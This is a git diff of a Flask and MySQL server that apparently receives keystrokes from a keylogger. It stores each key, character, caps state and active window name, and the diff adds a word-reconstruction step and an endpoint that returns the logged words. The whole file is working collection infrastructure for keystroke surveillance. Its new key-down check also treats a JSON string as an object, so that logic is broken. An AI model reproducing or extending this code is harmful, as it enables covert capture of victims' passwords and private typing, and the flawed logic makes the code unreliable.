@@ -2,21 +2,13 @@ from flask import Flask, render_template, request, make_response, jsonify
 import json
 from json import JSONEncoder
 import mysql.connector
-import os
 from datetime import datetime
+from process import Process
+from load_config import load_cfg
 
 #start flask app
 app = Flask(__name__, template_folder='templates')
 
-#load the configurations from json file
-def load_cfg(path):
-    jsonres = {}
-    try:
-        with open(os.path.abspath(os.path.realpath(path)), 'r') as f:
-            jsonres = json.load(f)
-    except Exception as e:
-        print("Exception: ", e)
-    return jsonres
     
 def datetime_converter(o):
   if isinstance(o,datetime):
@@ -29,11 +21,15 @@ def hello():
 @app.route('/pushKeys', methods=['POST'])
 def addLog():
   data = json.loads(request.data)
+  # Process.separateBreakChar(data)
 
   for key in range(len(data)):
-  
+    if (data[str(key)].isKeyDown == 1):
+      Process.separateBreakChar(data[str(key)])
+      
     try:
-      pushDB(json.loads(data[str(key)]))
+      pushDB_keys(json.loads(data[str(key)]))
+      
       
 
     except Exception as e:
@@ -44,7 +40,7 @@ def addLog():
   return make_response(jsonify({'response': 'Success', 'code':200}), 200)
 
 
-def pushDB(payload):
+def pushDB_keys(payload):
   main_cfg = load_cfg('./main_cfg.json')
 
   db = mysql.connector.connect (
@@ -57,7 +53,7 @@ def pushDB(payload):
   
   mycursor = db.cursor()
   
-  sql = f"INSERT INTO {main_cfg['dbTable']} {main_cfg['dbRows']} VALUES (%s, %s, %s, %s, %s, %s,%s, %s, %s)"
+  sql = f"INSERT INTO {main_cfg['dbKeyTable']} {main_cfg['dbRows']} VALUES (%s, %s, %s, %s, %s, %s,%s, %s, %s)"
   val = (f"{payload['datetime']}", f"{payload['epochTime']}", f"{payload['isKeyDown']}", f"{payload['windowName']}", f"{payload['asciiCode']}", f"{payload['asciiChar']}", f"{payload['keyName']}", f"{payload['isCaps']}", f"{payload['processedKey']}")
   print(sql,val)
   mycursor.execute(sql, val)
@@ -84,7 +80,30 @@ def pushKeylog():
   
   mycursor = db.cursor()
   
-  sql = f"SELECT * FROM {main_cfg['dbTable']}"
+  sql = f"SELECT * FROM {main_cfg['dbKeyTable']}"
+  mycursor.execute(sql)
+  res_query = [dict((mycursor.description[i][0],value) for i, value in enumerate(row)) for row in mycursor.fetchall()]
+  res = json.dumps(res_query, default=datetime_converter)
+  print(res)
+
+  return res
+
+@app.route('/showWordlog', methods=['GET'])
+def pushWordlog():
+  main_cfg = load_cfg('./main_cfg.json')
+  res = {}
+
+  db = mysql.connector.connect (
+    host=main_cfg['dbHost'],
+    port=main_cfg['port'],
+    user=main_cfg['sqlUser'],
+    password=main_cfg['sqlPass'],
+    database=main_cfg['db']
+  )
+  
+  mycursor = db.cursor()
+  
+  sql = f"SELECT * FROM {main_cfg['dbWordTable']}"
   mycursor.execute(sql)
   res_query = [dict((mycursor.description[i][0],value) for i, value in enumerate(row)) for row in mycursor.fetchall()]
   res = json.dumps(res_query, default=datetime_converter)
